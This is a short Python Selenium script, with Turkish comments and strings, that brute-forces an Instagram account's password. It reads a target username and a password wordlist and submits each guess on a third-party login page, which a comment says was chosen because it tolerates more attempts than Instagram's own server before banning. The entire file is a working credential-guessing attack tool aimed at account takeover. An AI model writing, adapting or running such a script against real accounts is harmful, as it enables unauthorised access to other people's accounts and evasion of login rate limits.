from selenium import webdriver
import sys


link = "https://instagram.begenapp.co/giris-yap" # gercek instagram sunucusu 5 istekte banlargen bu 20 istege kadar cikabilir. bundan dolayi bu site tercihim
br = webdriver.Firefox()
try:
	username = sys.argv[1]
	print "[OK] Username"
	ac = open(sys.argv[2]).readlines()
	print "[OK] Path to wordlist."
except:
	print "[!] Error..!"
	exit()


br.get(link)
br.find_element_by_name("username").send_keys(username)



say = 0

for i in ac:
	say += 1
	sifre = i.replace("\n", "")
	br.find_element_by_name("password").send_keys(sifre)
	br.find_element_by_id("login_insta").click()
	br.find_element_by_name("password").clear()
	kaynak = br.page_source
	try:
		assert "dikkatlice kontrol et." in kaynak
		print "[" + str(say) + "]: " + sifre
	except:
		print "-" * 40
		print "[Found]:", sifre
		print "-" * 40
		break

print "\n\n\n[Done] Ok."
